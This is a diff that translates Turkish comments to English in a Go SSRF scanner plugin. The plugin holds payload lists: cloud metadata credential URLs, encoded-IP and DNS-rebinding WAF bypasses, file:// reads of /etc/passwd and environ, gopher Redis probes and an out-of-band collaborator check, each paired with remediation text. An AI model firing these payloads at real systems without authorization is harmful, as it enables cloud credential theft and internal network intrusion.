@@ -12,7 +12,7 @@ import (
 // SSRF — v2.0 "Cloud Phantom"
 // Cloud Metadata · Gopher/Dict · Internal Probe
 // DNS Rebinding · Alt IP Formats · OOB Collaborator
-// Spider Entegrasyonu
+// Spider Integration
 // ==================================================
 type SSRFMetadataPlugin struct{}
 
@@ -43,12 +43,12 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 	}
 
 	// ══════════════════════════════════════════════════════════════════════
-	// PAYLOAD GRUPLARI
+	// PAYLOAD GROUPS
 	// ══════════════════════════════════════════════════════════════════════
 
-	// ── Grup 1: Cloud Metadata (standart IP) ────────────────────────────
+	// ── Group 1: Cloud Metadata (standard IP) ────────────────────────────
 	cloudPayloads := []SSRFPayload{
-		{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 Metadata (Standart)", 10.0},
+		{"http://169.254.169.254/latest/meta-data/", "ami-id", "AWS EC2 Metadata (Standard)", 10.0},
 		{"http://169.254.169.254/latest/user-data/", "#!/bin/bash", "AWS User-Data (Script)", 10.0},
 		{"http://169.254.170.2/v2/credentials/", "AccessKeyId", "AWS ECS Task Credentials", 10.0},
 		{"http://metadata.google.internal/computeMetadata/v1/", "Metadata-Flavor", "GCP Metadata (Header Leak)", 9.5},
@@ -58,8 +58,8 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		{"http://192.0.0.192/latest/", "oracle", "Oracle Cloud Metadata", 9.0},
 	}
 
-	// ── Grup 2: WAF Bypass — Alternatif IP formatları ───────────────────
-	// 127.0.0.1 bypass'ları
+	// ── Group 2: WAF Bypass — Alternative IP formats ───────────────────
+	// 127.0.0.1 bypasses
 	localhostBypass := []SSRFPayload{
 		{"http://0x7f000001/", "localhost_marker", "Hex IP (127.0.0.1 → 0x7f000001)", 9.5},
 		{"http://0177.0000.0000.0001/", "localhost_marker", "Octal IP (127.0.0.1 octal)", 9.5},
@@ -71,7 +71,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		{"http://127%252e0%252e0%252e1/", "localhost_marker", "Double URL Encoded Dot Bypass", 9.0},
 	}
 
-	// 169.254.169.254 (AWS) bypass'ları
+	// 169.254.169.254 (AWS) bypasses
 	awsBypass := []SSRFPayload{
 		{"http://0xA9FEA9FE/", "ami-id", "AWS Metadata (Hex IP)", 10.0},
 		{"http://2852039166/", "ami-id", "AWS Metadata (Decimal IP)", 10.0},
@@ -79,7 +79,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "ami-id", "AWS Metadata (IPv6-Mapped)", 10.0},
 	}
 
-	// ── Grup 3: DNS Rebinding / Wildcard DNS ────────────────────────────
+	// ── Group 3: DNS Rebinding / Wildcard DNS ────────────────────────────
 	dnsBypass := []SSRFPayload{
 		{"http://127.0.0.1.nip.io/", "localhost_marker", "DNS Rebinding via nip.io (127.0.0.1)", 9.5},
 		{"http://127.0.0.1.xip.io/", "localhost_marker", "DNS Rebinding via xip.io (127.0.0.1)", 9.5},
@@ -88,14 +88,14 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		{"http://169.254.169.254.xip.io/latest/meta-data/", "ami-id", "AWS Metadata via xip.io DNS", 10.0},
 	}
 
-	// ── Grup 4: LFI via file:// ─────────────────────────────────────────
+	// ── Group 4: LFI via file:// ─────────────────────────────────────────
 	filePayloads := []SSRFPayload{
 		{"file:///etc/passwd", "root:x:0:0", "Local File Inclusion (Linux /etc/passwd)", 9.0},
 		{"file://C:/Windows/win.ini", "[fonts]", "Local File Inclusion (Windows win.ini)", 9.0},
 		{"file:///proc/self/environ", "PATH=", "LFI via /proc/self/environ", 8.5},
 	}
 
-	// ── Grup 5: Internal Service Probe ──────────────────────────────────
+	// ── Group 5: Internal Service Probe ──────────────────────────────────
 	internalPorts := []struct {
 		Port int
 		Sig  string
@@ -121,7 +121,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		})
 	}
 
-	// ── Grup 6: Gopher Protocol ─────────────────────────────────────────
+	// ── Group 6: Gopher Protocol ─────────────────────────────────────────
 	gopherPayloads := []SSRFPayload{
 		{
 			"gopher://127.0.0.1:6379/_PING%0d%0a",
@@ -144,7 +144,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 	}
 
 	// ══════════════════════════════════════════════════════════════════════
-	// YARDIMCI FONKSIYON: Tek bir payload-param kombinasyonunu dene
+	// HELPER FUNCTION: Try a single payload-param combination
 	// ══════════════════════════════════════════════════════════════════════
 	probe := func(param, payloadURL, sig, desc string, cvss float64) *models.Vulnerability {
 		attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, payloadURL)
@@ -164,10 +164,10 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 				Severity: "CRITICAL",
 				CVSS:     cvss,
 				Description: fmt.Sprintf(
-					"Sunucu, '%s' parametresi aracılığıyla iç kaynağı çekti.\nPayload: %s\nKanıt: '%s' response'da bulundu.",
+					"Server retrieved internal resource via '%s' parameter.\nPayload: %s\nProof: '%s' was found in the response.",
 					param, payloadURL, sig,
 				),
-				Solution:  "URL girdilerini whitelist ile doğrulayın. file://, gopher://, dict:// schemalarını devre dışı bırakın. Cloud'da IMDSv2 kullanın.",
+				Solution:  "Validate URL inputs against a whitelist. Disable file://, gopher://, dict:// schemas. Use IMDSv2 in cloud environments.",
 				Reference: "CWE-918: Server-Side Request Forgery",
 			}
 		}
@@ -185,10 +185,10 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 				Severity: "HIGH",
 				CVSS:     8.5,
 				Description: fmt.Sprintf(
-					"Sunucu cloud metadata endpoint'ine erişmeye çalıştı (header eksik hatası sızdı).\nPayload: %s\nHata Önizlemesi: %s",
+					"Server attempted to access cloud metadata endpoint (missing header error leaked).\nPayload: %s\nError Preview: %s",
 					payloadURL, bodyPreview,
 				),
-				Solution:  "169.254.x.x aralığına giden iç IP isteklerini engelleyin. IMDSv2 ile metadata erişimini güçlendirin.",
+				Solution:  "Block outgoing internal IP requests to the 169.254.x.x range. Harden metadata access with IMDSv2.",
 				Reference: "CWE-918: Server-Side Request Forgery",
 			}
 		}
@@ -196,7 +196,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 	}
 
 	// ══════════════════════════════════════════════════════════════════════
-	// Tüm payload gruplarını tara
+	// Scan all payload groups
 	// ══════════════════════════════════════════════════════════════════════
 	allGroups := [][]SSRFPayload{
 		cloudPayloads,
@@ -217,9 +217,9 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		}
 	}
 
-	// ── Localhost bypass payloads — özel kontrol ─────────────────────────
-	// (Sig olarak "localhost_marker" olan payload'lar için sunucunun
-	//  herhangi bir iç içerik döndürmesi yeterli: 200 + non-empty body)
+	// ── Localhost bypass payloads — custom check ─────────────────────────
+	// (For payloads with "localhost_marker" signature, the server
+	//  returning any internal content is sufficient: 200 + non-empty body)
 	for _, param := range params {
 		for _, pl := range localhostBypass {
 			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, pl.URL)
@@ -231,7 +231,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 			resp.Body.Close()
 			body := string(bodyBytes)
 
-			// 200 + boş olmayan içerik + hedef sitenin kendi içeriği değilse
+			// 200 + non-empty content + not the target site's own content
 			if resp.StatusCode == 200 && len(body) > 50 && !strings.Contains(body, "<html") {
 				return &models.Vulnerability{
 					Target:   target,
@@ -239,10 +239,10 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 					Severity: "CRITICAL",
 					CVSS:     pl.CVSS,
 					Description: fmt.Sprintf(
-						"Localhost bypass tekniği ile SSRF doğrulandı.\nTeknik: %s\nPayload: %s\nParam: %s\nResponse boyutu: %d byte",
+						"SSRF confirmed via localhost bypass technique.\nTechnique: %s\nPayload: %s\nParam: %s\nResponse Size: %d bytes",
 						pl.Desc, pl.URL, param, len(body),
 					),
-					Solution:  "127.0.0.1, 0.0.0.0, [::1] ve tüm encoding varyantlarını whitelist dışında engelleyin.",
+					Solution:  "Block 127.0.0.1, 0.0.0.0, [::1] and all encoding variants except whitelisted ones.",
 					Reference: "CWE-918: Server-Side Request Forgery",
 				}
 			}
@@ -258,7 +258,7 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 	}
 
 	if collabURL != "" {
-		for _, param := range params[:5] { // İlk 5 parametre yeterli
+		for _, param := range params[:5] { // First 5 parameters are sufficient
 			attackURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, collabURL)
 			req, err := http.NewRequest("GET", attackURL, nil)
 			if err != nil {
@@ -270,8 +270,8 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 			}
 			resp.Body.Close()
 
-			// OOB callback kontrolü: Eğer collaborator sunucusuna istek gelirse
-			// bu kontrolü yapan harici servis SharedData'ya "collab_hit" yazar
+			// OOB callback check: If request comes to collaborator server,
+			// the external service performing this check writes "collab_hit" to SharedData
 			if hitVal, hit := models.SharedData.Load("collab_hit"); hit {
 				if hitParam, ok := hitVal.(string); ok && hitParam != "" {
 					return &models.Vulnerability{
@@ -280,10 +280,10 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 						Severity: "CRITICAL",
 						CVSS:     10.0,
 						Description: fmt.Sprintf(
-							"SSRF, Out-of-Band (OOB) callback ile kesin olarak doğrulandı.\nCollaborator URL'sine geri bağlantı alındı.\nParam: %s\nCollaborator: %s\nKanıt: %s",
+							"SSRF definitively confirmed via Out-of-Band (OOB) callback.\nCallback received at collaborator URL.\nParam: %s\nCollaborator: %s\nProof: %s",
 							param, collabURL, hitParam,
 						),
-						Solution:  "Giden HTTP isteklerini whitelist bazlı filtreleyin. Tüm dış URL schemalarını devre dışı bırakın.",
+						Solution:  "Filter outgoing HTTP requests based on a whitelist. Disable all external URL schemas.",
 						Reference: "CWE-918: Server-Side Request Forgery",
 					}
 				}
@@ -291,20 +291,20 @@ func (p *SSRFMetadataPlugin) Run(target models.ScanTarget) *models.Vulnerability
 		}
 	}
 
-	// ── Spider Endpoint Entegrasyonu ─────────────────────────────────────
+	// ── Spider Endpoint Integration ─────────────────────────────────────
 	key := "endpoints_" + target.IP
 	if existing, ok := models.SharedData.Load(key); ok {
 		spiderEndpoints := existing.([]models.Endpoint)
 		for _, ep := range spiderEndpoints {
 			if ep.Method == "GET" && len(ep.Params) > 0 {
 				for _, param := range ep.Params {
-					// SSRF'e duyarlı parametre mi?
+					// Is it an SSRF-sensitive parameter?
 					if !containsAny(strings.ToLower(param),
 						"url", "uri", "link", "dest", "redirect", "src", "source",
 						"file", "fetch", "load", "open", "image", "proxy", "host") {
 						continue
 					}
-					// En kritik payload'ları dene
+					// Try the most critical payloads
 					for _, pl := range cloudPayloads[:3] {
 						if vuln := probe(param, pl.URL, pl.Sig, pl.Desc+" (Spider)", pl.CVSS); vuln != nil {
 							vuln.Name += " (Spider-Discovered)"
